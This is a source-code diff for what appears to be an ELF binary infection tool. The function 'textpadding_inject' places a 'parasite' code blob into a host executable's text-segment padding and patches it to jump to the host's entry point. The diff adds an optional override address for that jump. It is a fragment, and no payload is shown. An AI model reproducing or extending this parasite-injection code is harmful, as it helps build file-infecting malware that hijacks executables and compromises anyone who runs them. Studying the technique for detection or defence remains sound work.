@@ -6,10 +6,12 @@
  * @param host filename containing the host
  * @param parasite filename containing the parasite
  * @param patch_position position in the parasite code to insert the host's code address
+ * @param patch_addr the address to patch the parasite with, when 0 this defaultsto the original entry_point
  */
-uint32_t textpadding_inject(Elfit_t *host, char *parasite, uint32_t patch_position)
+uint32_t textpadding_inject(Elfit_t *host, char *parasite, uint32_t patch_position
+, unsigned long patch_addr)
 {
-    unsigned long entry_point, text_offset, text_begin;
+    unsigned long entry_point, text_offset, text_begin, tmp_addr;
     unsigned int entry_offset;
     unsigned char buf[PAGE_SIZE];
     unsigned int ehdr_size;
@@ -102,8 +104,13 @@ uint32_t textpadding_inject(Elfit_t *host, char *parasite, uint32_t patch_positi
     int preparasite_size_file = text_offset + entry_offset;
 
     // patch parasite code
-    *(unsigned long *)&buf[patch_position] = entry_point;
-    printf("Patching parasite to jmp to %x\n", entry_point);
+    if (patch_addr == 0)
+        tmp_addr = entry_point;
+    else
+        tmp_addr = patch_addr;
+
+    *(unsigned long *)&buf[patch_position] = tmp_addr;
+    printf("Patching parasite to jmp to %x\n", tmp_addr);
 
     if ((ofd = open(TMP, O_CREAT | O_WRONLY | O_TRUNC, host->file->st_mode))
         < 0) 
